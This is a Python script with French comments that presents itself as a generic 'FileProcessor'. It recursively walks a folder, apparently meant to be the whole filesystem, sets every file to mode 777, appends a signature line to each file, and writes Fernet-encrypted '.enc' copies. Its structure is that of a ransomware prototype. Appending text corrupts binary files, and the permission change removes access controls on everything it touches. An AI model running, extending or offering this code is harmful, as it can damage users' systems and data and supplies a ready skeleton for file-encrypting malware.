import os
import logging
from cryptography.fernet import Fernet

# Configuration du logging pour afficher les infos/debug
logging.basicConfig(
    level=logging.DEBUG,
    format="%(levelname)s: %(message)s"
)

# Dossier racine à traiter (tu dois le modifier avant d'exécuter)
ROOT_PATH = "/chemin/vers/ton/dossier"

# Mode test : si True, aucun fichier n'est modifié
DRY_RUN = False

# Signature ajoutée aux fichiers déjà traités
SIGNATURE = "# === FILE_PROCESSOR_SIGNATURE_v1 ==="

# Fichiers à ignorer explicitement
SKIP_FILES = {"/swap.img"}

# Nom du fichier contenant la clé de chiffrement
KEY_FILE_NAME = "encryption_key.key"


def load_or_create_cipher(root_path):
    """
    Charge une clé de chiffrement depuis un fichier.
    Si la clé n'existe pas, on en génère une nouvelle.
    Ceci permet de déchiffrer plus tard les fichiers .enc
    """
    key_path = os.path.join(root_path, KEY_FILE_NAME)

    if os.path.exists(key_path):
        logging.info(f"Chargement de la clé depuis : {key_path}")
        with open(key_path, "rb") as f:
            key = f.read()
    else:
        logging.info(f"Aucune clé trouvée, génération d'une nouvelle clé : {key_path}")
        key = Fernet.generate_key()
        # On sauvegarde la clé pour permettre le déchiffrement futur
        with open(key_path, "wb") as f:
            f.write(key)

    # On retourne un objet Fernet configuré avec la clé
    return Fernet(key)


class FileProcessor:
    def __init__(self, root_path):
        # On garde le chemin absolu du dossier
        self.root_path = os.path.abspath(root_path)
        # On charge/initialise le chiffreur
        self.cipher = load_or_create_cipher(self.root_path)

    def process(self):
        count = 0  # Compteur de fichiers traités

        # On vérifie que le dossier existe
        if not os.path.exists(self.root_path):
            raise FileNotFoundError(f"Le dossier {self.root_path} n'existe pas !")

        # Parcours récursif du dossier
        for dirpath, dirs, files in os.walk(self.root_path):
            for file in files:
                full_path = os.path.join(dirpath, file)

                # Skip de fichiers explicites
                if full_path in SKIP_FILES:
                    logging.debug(f"Fichier dans SKIP_FILES, on saute : {full_path}")
                    continue

                # On ne chiffre pas les fichiers déjà chiffrés
                if full_path.endswith(".enc"):
                    logging.debug(f"Fichier déjà chiffré (.enc), on saute : {full_path}")
                    continue

                # On tente d'ouvrir les permissions pour éviter des erreurs d'accès
                try:
                    os.chmod(full_path, 0o777)
                except PermissionError:
                    pass  # Si ça échoue, on n'abandonne pas

                # On vérifie si le fichier contient déjà la signature
                try:
                    with open(full_path, "r", encoding="utf-8", errors="ignore") as f:
                        content = f.read()
                        if SIGNATURE in content:
                            logging.debug(f"Déjà signé, on saute : {full_path}")
                            continue
                except (PermissionError, OSError):
                    # Si on ne peut pas lire en texte, ce n'est pas grave, on continue quand même
                    pass

                logging.debug(f"Traitement du fichier : {full_path}")

                # Si on est en mode test, on ne modifie rien
                if DRY_RUN:
                    count += 1
                    continue

                # On ajoute la signature afin d'éviter un retraitement futur
                try:
                    with open(full_path, "a", encoding="utf-8", errors="ignore") as f:
                        f.write(f"\n{SIGNATURE}\n")
                except Exception as e:
                    logging.warning(f"Impossible d'écrire la signature dans {full_path} : {e}")

                # Lecture du fichier en binaire pour le chiffrement
                try:
                    with open(full_path, "rb") as f:
                        data = f.read()
                except Exception as e:
                    logging.warning(f"Impossible de lire {full_path} : {e}")
                    continue

                # Chiffrement du contenu du fichier
                try:
                    encrypted_data = self.cipher.encrypt(data)

                    # Création du fichier chiffré à côté, avec extension .enc
                    encrypted_path = full_path + ".enc"
                    with open(encrypted_path, "wb") as f:
                        f.write(encrypted_data)

                    logging.debug(f"Fichier chiffré (original conservé) : {encrypted_path}")
                    count += 1

                except Exception as e:
                    logging.warning(f"Erreur lors du chiffrement de {full_path} : {e}")

        # Résumé du traitement
        logging.info(f"Total fichiers signés et chiffrés (originaux conservés) : {count}")
        return count


if __name__ == "__main__":
    processor = FileProcessor(ROOT_PATH)
    processor.process()
